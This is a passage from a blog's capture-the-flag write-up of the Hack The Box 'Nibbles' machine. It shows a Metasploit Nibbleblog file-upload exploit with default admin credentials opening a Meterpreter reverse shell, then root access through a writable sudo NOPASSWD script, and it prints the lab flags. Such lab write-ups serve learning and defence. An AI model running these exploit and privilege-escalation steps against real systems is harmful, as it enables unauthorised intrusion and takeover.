</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
</span></span><span class=line><span class=cl>   LHOST  209.151.148.245  yes       The listen address <span class=o>(</span>an interface may be s
</span></span><span class=line><span class=cl>                                     pecified<span class=o>)</span>
</span></span><span class=line><span class=cl>   LPORT  <span class=m>4444</span>             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   <span class=m>0</span>   Nibbleblog 4.0.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt;
</span></span></code></pre></div><p>We&rsquo;ve got everything we need. Now Just have to configure the options.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; <span class=nb>set</span> rhost 10.129.118.233
</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.129.118.233
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; <span class=nb>set</span> lhost 10.10.15.26
</span></span><span class=line><span class=cl><span class=nv>rhost</span> <span class=o>=</span>&gt; 10.10.15.26
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; <span class=nb>set</span> username admin
</span></span><span class=line><span class=cl><span class=nv>username</span> <span class=o>=</span>&gt; admin
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; <span class=nb>set</span> password nibbles
</span></span><span class=line><span class=cl><span class=nv>password</span> <span class=o>=</span>&gt; nibbles
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; <span class=nb>set</span> targeturi nibbleblog/
</span></span><span class=line><span class=cl><span class=nv>targeturi</span> <span class=o>=</span>&gt; nibbleblog/
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.15.26:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>39927</span> bytes<span class=o>)</span> to 10.129.118.233
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Deleted image.php
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.10.15.26:4444 -&gt; 10.129.118.233:37544<span class=o>)</span> at 2023-11-13 21:15:55 +0000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>meterpreter&gt; sysinfo
</span></span><span class=line><span class=cl>Computer    : Nibbles
</span></span><span class=line><span class=cl>OS          : Linux Nibbles 4.4.0-104-generic <span class=c1>#127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64</span>
</span></span><span class=line><span class=cl>Meterpreter : php/linux
</span></span><span class=line><span class=cl>meterpreter&gt; &gt; execute -if <span class=s2>&#34;cat /home/*/user.txt&#34;</span>
</span></span><span class=line><span class=cl>Process <span class=m>1691</span> created.
</span></span><span class=line><span class=cl>Channel <span class=m>3</span> created.
</span></span><span class=line><span class=cl>79c03865431abf47b90ef24b9695e148
</span></span></code></pre></div><h3 id=privesc>privesc<a hidden class=anchor aria-hidden=true href=#privesc>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> nibbler on Nibbles:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User nibbler may run the following commands on Nibbles:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
</span></span></code></pre></div><p>Welp that&rsquo;s easy. Put whatever you want in <code>monitor.sh</code> (revshell, cmds, etc) and have root privs.</p><h3 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h3><p><strong>user.txt:</strong> <code>79c03865431abf47b90ef24b9695e148</code></p><p><strong>root.txt:</strong> <code>de5e5d6619862a8aa5b9b212314e0cdd</code></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://woadey.xyz/posts/htb/pentester/><span class=title>Next »</span><br><span>HTB Academy: Penetration Tester</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://woadey.xyz/>woadey</a></span>
<span>· Theme: tweaked
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>